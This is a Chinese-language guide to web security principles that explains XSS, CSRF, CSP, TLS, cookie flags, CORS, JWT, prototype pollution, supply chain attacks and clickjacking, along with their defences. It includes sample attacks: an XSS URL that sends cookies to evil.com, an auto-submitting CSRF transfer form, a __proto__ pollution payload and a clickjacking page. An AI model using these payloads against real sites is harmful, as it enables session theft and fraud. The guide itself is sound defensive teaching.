# Web 安全原理指南

> 涵盖 XSS、CSRF、CSP、HTTPS 传输安全、Cookie 安全、CORS、JWT 鉴权、原型链污染、供应链攻击、点击劫持

---

## 目录

1. [XSS 深度](#一xss-深度)
2. [CSRF 深度](#二csrf-深度)
3. [内容安全策略 CSP](#三内容安全策略-csp)
4. [HTTPS / 传输安全](#四https--传输安全)
5. [Cookie 安全属性](#五cookie-安全属性)
6. [CORS 与安全边界](#六cors-与安全边界)
7. [JWT / 鉴权安全](#七jwt--鉴权安全)
8. [原型链污染 & 供应链攻击](#八原型链污染--供应链攻击)
9. [点击劫持 & 其他攻击](#九点击劫持--其他攻击)
10. [安全加固综合实践](#十安全加固综合实践)

---

## 一、XSS 深度

### 三种 XSS 的本质区别

| 类型 | 数据流向 | 典型场景 | 危险等级 |
|------|---------|---------|---------|
| 存储型 | 攻击者→数据库→受害者 | 用户评论/昵称/签名 | ⚡⚡⚡ 最高 |
| 反射型 | URL 参数→服务器→响应页面 | 搜索结果、错误提示 | ⚡⚡ 中等 |
| DOM 型 | URL/localStorage→前端 JS→DOM | SPA 客户端路由参数 | ⚡⚡ 中等 |

**本质区别**：
- 存储型和反射型：恶意 payload 经过服务器处理后输出到 HTML
- DOM 型：完全在客户端，服务器无感知，`document.write`、`innerHTML`、`eval` 是高危操作

**DOM XSS 典型案例**：
```js
// 客户端路由参数未做转义
const destination = new URLSearchParams(location.search).get('city')
document.getElementById('title').innerHTML = `搜索：${destination}` // ⚠️ 危险

// 攻击 URL：
// /search?city=<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">

// 修复：使用 textContent 而非 innerHTML，或用 DOMPurify 消毒
document.getElementById('title').textContent = `搜索：${destination}`
```

---

### React/Vue 开发中容易引入 XSS 的编码模式

```jsx
// ❌ 1. dangerouslySetInnerHTML 未消毒
<div dangerouslySetInnerHTML={{ __html: userContent }} />

// ❌ 2. href 接受用户输入
const url = getUserInput() // 可能是 javascript:alert(1)
<a href={url}>点击</a>

// ❌ 3. eval / new Function
const template = localStorage.getItem('template')
eval(template) // 🔴 极度危险

// ❌ 4. 模板字符串注入 DOM
document.body.innerHTML = `<div>${req.query.name}</div>`

// ❌ 5. 第三方富文本组件未配置白名单
<ReactQuill value={content} /> // 需要配合 sanitize 配置
```

**正确做法**：
```jsx
// ✅ React 文本插值自动转义
<div>{userContent}</div>

// ✅ 需要富文本时用 DOMPurify
import DOMPurify from 'dompurify'
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(content) }} />

// ✅ 链接白名单校验
const safeUrl = /^https?:\/\//.test(url) ? url : '#'
<a href={safeUrl}>点击</a>
```

---

### Trusted Types API 从根源上阻止 DOM XSS

**Trusted Types**（Chrome 83+）是浏览器级别的 DOM XSS 防护机制：

```js
// 1. 开启 Trusted Types（通过 CSP 头）
// Content-Security-Policy: require-trusted-types-for 'script'

// 2. 创建 policy（相当于消毒函数的注册中心）
const policy = trustedTypes.createPolicy('default', {
  createHTML: (input) => DOMPurify.sanitize(input),
  createScriptURL: (url) => {
    if (url.startsWith('https://cdn.example.com')) return url
    throw new Error('不允许的脚本来源')
  },
})

// 3. 使用 policy 包装，否则浏览器拒绝
element.innerHTML = policy.createHTML(userInput) // ✅
element.innerHTML = userInput                     // ❌ 浏览器报错
```

**优势**：即使代码审查漏掉了一个 `innerHTML`，浏览器也会拦截未经 policy 处理的字符串。

---

## 二、CSRF 深度

### 为什么 CSRF 只需"请求发出"就能攻击？

**核心原因**：CSRF 利用的是**状态修改操作**（转账、改密码、下单），这些操作只需服务器执行，不需要攻击者读取返回值。

```html
<!-- 恶意网站中的自动提交表单 -->
<form action="https://bank.example.com/api/transfer" method="POST" id="csrf">
  <input name="to" value="attacker">
  <input name="amount" value="9999">
</form>
<script>document.getElementById('csrf').submit()</script>
```

**跨域读取被 CORS 阻止，但跨域写入（提交）默认允许** ← CSRF 的根本原因。

---

### SameSite=Lax 和 SameSite=Strict 的区别

| 模式 | Cookie 何时发送 |
|------|----------------|
| `Strict` | 仅同站请求携带 |
| `Lax` | 同站 + 顶级导航的 GET 请求 |
| `None` | 任何请求（需配合 `Secure`）|

**Lax 失效场景**：
```
场景 1：攻击者用 GET 请求触发状态变更
GET /api/user/delete?id=123
→ Lax 不防护 GET，如果后端误用 GET 做删除操作就被绕过

场景 2：a 标签导航跳转
<a href="https://example.com/logout"> → Lax 允许，Cookie 会携带 ← CSRF 风险
```

**最佳实践**：
- 所有写操作使用 POST + CSRF Token
- Cookie 设置 `SameSite=Lax; Secure; HttpOnly`
- 关键接口（支付、改密）额外验证 `Referer`

---

### 双重 Cookie 验证方案

**原理**：CSRF 攻击的关键限制是**攻击者无法读取受害者的 Cookie**

```
1. 登录时，服务端在 Cookie 中写入随机 token（非 HttpOnly）
   Set-Cookie: csrf_token=abc123; SameSite=Lax; Secure

2. 前端请求时，从 Cookie 读取该 token，放入请求头
   X-CSRF-Token: abc123

3. 服务端验证请求头中的 token 和 Cookie 中的 token 是否一致
```

**好处**：服务端无需存储 token（无状态），适合分布式系统

**局限性**：
```
子域名 Cookie 注入攻击：
攻击者控制了子域（如 evil.sub.example.com）
→ 可通过 document.cookie = 'csrf_token=attacker; domain=.example.com' 覆盖 token
→ 然后在请求头中放相同的 attacker token → 通过验证

防御：严格控制子域 Cookie 作用域，使用 __Host- 前缀
Set-Cookie: __Host-csrf_token=abc123; Secure; Path=/; SameSite=Strict
```

---

## 三、内容安全策略 CSP

### CSP 核心指令

```
default-src    → 所有资源的默认策略
script-src     → JS 脚本来源（最重要）
style-src      → CSS 来源
img-src        → 图片来源
connect-src    → fetch/XHR/WebSocket 目标
frame-src      → iframe 来源
font-src       → 字体来源
report-uri     → 违规上报地址
```

**典型配置示例**：
```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.example.com 'nonce-{随机值}';
  style-src 'self' https://cdn.example.com 'unsafe-inline';
  img-src 'self' data: https://*.example.com;
  connect-src 'self' https://api.example.com wss://ws.example.com;
  frame-src 'none';
  report-uri /csp-report;
```

**关键注意**：
- `'unsafe-inline'` 允许内联脚本，会大幅削弱 XSS 防护
- 推荐用 `nonce` 方案代替 `unsafe-inline`：每次请求服务端生成随机 nonce，内联脚本加 `nonce` 属性
- 先用 `Content-Security-Policy-Report-Only` 测试，收集违规日志再切到强制模式

---

### CSP nonce 方案在 React SSR 中落地

```js
// Next.js / Node.js SSR 中的 nonce 方案
import { randomBytes } from 'crypto'

export async function getServerSideProps(context) {
  const nonce = randomBytes(16).toString('base64')

  // 设置 CSP 响应头，包含 nonce
  context.res.setHeader(
    'Content-Security-Policy',
    `script-src 'self' 'nonce-${nonce}' https://cdn.example.com`
  )

  return { props: { nonce } }
}

function Page({ nonce }) {
  return (
    <>
      <Script nonce={nonce} strategy="beforeInteractive" src="/analytics.js" />
      <script
        nonce={nonce}
        dangerouslySetInnerHTML={{ __html: `window.__CONFIG__ = ${JSON.stringify(config)}` }}
      />
    </>
  )
}
```

---

## 四、HTTPS / 传输安全

### TLS 1.3 握手相比 TLS 1.2 优化

**TLS 1.2 握手（2-RTT）**：
```
Client → Server: ClientHello（支持的算法列表）
Client ← Server: ServerHello + 证书 + ServerHelloDone
Client → Server: 密钥交换 + ChangeCipherSpec + Finished
Client ← Server: ChangeCipherSpec + Finished
→ 2 个往返才能开始传输数据
```

**TLS 1.3 优化（1-RTT）**：
- 删除不安全算法（RSA 密钥交换、RC4、SHA-1 等）
- 客户端在 ClientHello 中直接附带密钥份额（key_share），服务端一次响应即可完成握手
- 握手消息从第二条起就加密

**0-RTT（Session Resumption）**：
```
首次连接后，服务端颁发 Session Ticket（包含会话密钥）
再次连接时，客户端直接用 Session Ticket 发送加密数据
→ 零往返延迟

⚠️ 风险：0-RTT 数据无法抵御重放攻击（Replay Attack）
→ 最佳实践：只对幂等的 GET 请求开启 0-RTT，写操作禁用
```

---

### HSTS（HTTP Strict Transport Security）

**HSTS 解决的问题**：
- 用户第一次访问 http://example.com → 服务器重定向到 HTTPS → 这次重定向过程中可被 MITM 攻击（SSL Strip）
- HSTS 告诉浏览器：**以后直接用 HTTPS，不要发 HTTP 请求**

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**字段含义**：
- `max-age`：记住 HSTS 策略的时间（秒），建议 1 年以上
- `includeSubDomains`：子域名也强制 HTTPS
- `preload`：申请加入浏览器内置 HSTS 预加载列表（首次访问就是 HTTPS）

**preload 的风险**：
- 一旦加入预加载列表，**移除极困难**（需要等所有浏览器更新）
- 确保整个域名（含子域）永久支持 HTTPS 才能开启

---

## 五、Cookie 安全属性

### 4 个安全属性各解决什么威胁

| 属性 | 防御的威胁 | 说明 |
|------|-----------|------|
| `HttpOnly` | XSS 窃取 Cookie | JS 无法通过 `document.cookie` 读取 |
| `Secure` | HTTP 明文传输窃听 | 只在 HTTPS 下发送 |
| `SameSite=Lax` | CSRF | 跨站请求不自动携带 |
| `__Host-` 前缀 | 子域 Cookie 注入 | 必须是 Secure，Path=/，且无 Domain |

**Session Cookie 最佳配置**：
```
Set-Cookie: __Host-session=TOKEN;
  HttpOnly;
  Secure;
  SameSite=Lax;
  Path=/;
  Max-Age=86400
```

**第三方 Cookie（埋点/广告场景）**：
```
Set-Cookie: track=ID; SameSite=None; Secure
```
Chrome 正在淘汰第三方 Cookie，需迁移到 Privacy Sandbox（Topics API / CHIPS）。

---

## 六、CORS 与安全边界

### 为什么"简单请求"不需要预检？

**简单请求（不触发预检）条件**（需同时满足）：
1. 方法：GET / POST / HEAD
2. Content-Type：`text/plain` / `application/x-www-form-urlencoded` / `multipart/form-data`
3. 无自定义请求头

**原因**：简单请求模拟了 HTML 表单提交的行为，浏览器认为服务器已经"习惯"处理这类请求（历史遗留设计）。

**预检流程**：
```
OPTIONS /api/order HTTP/1.1
Origin: https://app.example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: X-Request-Id

HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: PUT, POST
Access-Control-Allow-Headers: X-Request-Id
Access-Control-Max-Age: 86400  ← 缓存预检结果，减少额外请求
```

---

### `Access-Control-Allow-Origin: *` 和 `withCredentials` 为什么不能同时使用？

**规范限制**：当请求携带凭证（Cookie / Authorization），浏览器要求 CORS 响应头明确指定来源，不允许通配符 `*`。

**正确配置**：
```js
// 服务端动态反射 Origin（需要白名单校验！）
const ALLOWED_ORIGINS = ['https://app.example.com', 'https://h5.example.com']

app.use((req, res) => {
  const origin = req.headers.origin
  if (ALLOWED_ORIGINS.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin)  // 指定具体 origin
    res.setHeader('Access-Control-Allow-Credentials', 'true')
    res.setHeader('Vary', 'Origin')  // 告诉 CDN 按 Origin 缓存
  }
})
```

**安全警告**：不加白名单直接 reflect origin 是 CORS 配置漏洞，会导致凭证被任意域名读取。

---

## 七、JWT / 鉴权安全

### JWT 存在哪些安全风险？

```
1. alg=none 攻击：某些库接受 alg=none 的 JWT（无签名），绕过验证
   防御：服务端显式指定允许的算法，拒绝 none

2. 密钥泄露：JWT 一旦签发无法撤销（无状态），泄露后攻击者可用到过期
   防御：缩短有效期 + Refresh Token 轮转

3. 敏感信息明文：JWT payload 只是 Base64，不是加密
   防御：不在 payload 中存敏感数据（身份证号、手机号）
```

### localStorage 还是 Cookie 存储更安全？

| 存储位置 | XSS 风险 | CSRF 风险 | 推荐场景 |
|---------|---------|---------|---------|
| `localStorage` | 高（JS 可直接读取） | 低（需手动添加头） | SPA + 无敏感操作 |
| `Cookie (HttpOnly)` | 低（JS 不可读） | 中（需 SameSite 配合） | **推荐** |
| 内存（React state） | 低 | 低 | 刷新即失效，体验差 |

**最佳实践**：
- Access Token 存内存（短期，1 小时）
- Refresh Token 存 HttpOnly Cookie（长期，7 天）
- 关键操作二次鉴权

---

## 八、原型链污染 & 供应链攻击

### 原型链污染

**原理**：通过控制 `__proto__` 或 `constructor.prototype`，修改 Object 原型，影响所有对象。

```js
// 漏洞代码：递归合并对象时未校验 key
function merge(target, source) {
  for (const key of Object.keys(source)) {
    if (typeof source[key] === 'object') {
      merge(target[key], source[key])  // ← key 可能是 __proto__
    } else {
      target[key] = source[key]
    }
  }
}

// 攻击载荷（来自用户输入的 JSON）
const malicious = JSON.parse('{"__proto__": {"isAdmin": true}}')
merge({}, malicious)

console.log({}.isAdmin) // true ← 所有对象都被污染了
```

**防御**：
```js
// 1. 使用 Object.create(null) 创建无原型对象
const safe = Object.create(null)

// 2. 校验 key 不能是 __proto__ / constructor / prototype
if (key === '__proto__' || key === 'constructor') continue

// 3. 使用 Object.assign 或展开运算符（不递归，较安全）

// 4. 升级依赖：lodash >= 4.17.21 修复了此问题
```

---

### 前端供应链攻击

**攻击形式**：
1. **包名仿冒（Typosquatting）**：`lodahs` 仿冒 `lodash`
2. **依赖劫持**：入侵流行包的 npm 账号并推送恶意版本
3. **postinstall 脚本**：安装时自动执行恶意脚本
4. **恶意传递依赖**：直接依赖安全，但间接依赖有漏洞

**检测和防御**：
```bash
# 1. 锁定版本，提交 lockfile
# package-lock.json / pnpm-lock.yaml 禁止忽略

# 2. 安全审计
npm audit
pnpm audit

# 3. CI 中高危漏洞阻断构建
npx audit-ci --high

# 4. 限制 postinstall（pnpm）
# .npmrc
ignore-scripts=true

# 5. 子资源完整性（CDN 引入时）
<script
  src="https://cdn.example.com/react.min.js"
  integrity="sha384-abc123..."
  crossorigin="anonymous"
></script>
```

---

## 九、点击劫持 & 其他攻击

### 点击劫持（Clickjacking）

**原理**：攻击者将受害网站嵌入透明 iframe，叠在诱骗按钮之上，欺骗用户点击。

```html
<!-- 攻击页面示例 -->
<style>
  iframe { opacity: 0.01; position: absolute; top: 0; z-index: 999 }
</style>
<button>领取优惠券！</button>
<iframe src="https://target.example.com/order/pay?id=123"></iframe>
<!-- 用户以为点的是优惠券，实际点的是支付确认 -->
```

**防御方案对比**：

| 方案 | 特点 |
|------|------|
| `X-Frame-Options: DENY` | 旧标准，简单，不支持白名单 |
| `X-Frame-Options: SAMEORIGIN` | 允许同域 iframe |
| `CSP: frame-ancestors 'none'` | 新标准，支持精细白名单 |
| `CSP: frame-ancestors 'self' https://partner.com` | 允许指定来源嵌入 |

**推荐**：使用 `Content-Security-Policy: frame-ancestors 'self'`（额外加 `X-Frame-Options` 向前兼容）。

---

### 开放重定向（Open Redirect）

```js
// ❌ 未校验，攻击者构造：/login?redirect=https://evil.com/phishing
const redirect = new URLSearchParams(location.search).get('redirect')
router.replace(redirect)

// 安全做法：
function safeRedirect(url) {
  try {
    const parsed = new URL(url, location.origin)
    // 只允许同域跳转
    if (parsed.origin !== location.origin) {
      return '/'
    }
    return parsed.pathname + parsed.search
  } catch {
    return '/'
  }
}
```

---

## 十、安全加固综合实践

### XSS 漏洞应急响应流程

**应急响应（0-4 小时）**：
1. **确认范围**：是存储型还是反射型？影响哪些页面/用户？
2. **临时阻断**：
   - 存储型：下线/清理被污染的数据库记录，或在 CDN 层拦截含可疑 `<script>` 的响应
   - 反射型：在 WAF 层添加规则，拦截含 XSS payload 的请求
3. **用户通知**：评估是否需要强制下线所有 Session（Cookie 泄露风险）

**根因修复（4-24 小时）**：
```js
// 定位：找到所有 innerHTML / dangerouslySetInnerHTML 的使用
// 修复：消毒或改用 textContent
element.textContent = userContent  // 简单场景
element.innerHTML = DOMPurify.sanitize(userContent)  // 富文本场景
```

**复盘（1-2 周）**：
1. **代码层**：全局 ESLint 规则禁止 `innerHTML` 直接赋值，强制 DOMPurify
2. **CSP 层**：上线 `Content-Security-Policy-Report-Only` 监控，逐步收紧
3. **测试层**：引入 DOM XSS 安全扫描（ZAP / Burp Suite）进入 CI
4. **流程层**：安全评审 Checklist，用户输入必须过消毒函数

---

### 完整 HTTP 安全响应头配置

```nginx
# Nginx 配置
server {
  # 防止内容类型嗅探
  add_header X-Content-Type-Options "nosniff" always;

  # 点击劫持防护
  add_header X-Frame-Options "SAMEORIGIN" always;
  add_header Content-Security-Policy "frame-ancestors 'self'" always;

  # XSS 过滤（旧浏览器）
  add_header X-XSS-Protection "1; mode=block" always;

  # HTTPS 强制
  add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;

  # 限制 Referer 信息泄露
  add_header Referrer-Policy "strict-origin-when-cross-origin" always;

  # 权限策略（禁用不必要的浏览器 API）
  add_header Permissions-Policy "camera=(), microphone=(), geolocation=(self)" always;

  # CSP（重点）
  add_header Content-Security-Policy "
    default-src 'self';
    script-src 'self' https://cdn.example.com 'nonce-$csp_nonce';
    style-src 'self' https://cdn.example.com 'unsafe-inline';
    img-src 'self' data: https://*.example.com;
    connect-src 'self' https://api.example.com;
    frame-src 'none';
    object-src 'none';
    base-uri 'self';
    report-uri /csp-violations;
  " always;
}
```

---

## 速查表

| 主题 | 核心防御手段 |
|------|---------|
| XSS | innerHTML → textContent / DOMPurify、CSP nonce、Trusted Types |
| CSRF | SameSite Cookie、CSRF Token、双重 Cookie 验证 |
| HTTPS | TLS 1.3、HSTS、证书验证 |
| Cookie | HttpOnly + Secure + SameSite + `__Host-` 前缀 |
| CORS | 白名单校验、withCredentials 配合具体 Origin |
| JWT | alg 白名单、短有效期、Refresh Token 轮转 |
| 供应链 | lockfile、npm audit、SRI Hash |
| 点击劫持 | CSP frame-ancestors、X-Frame-Options |
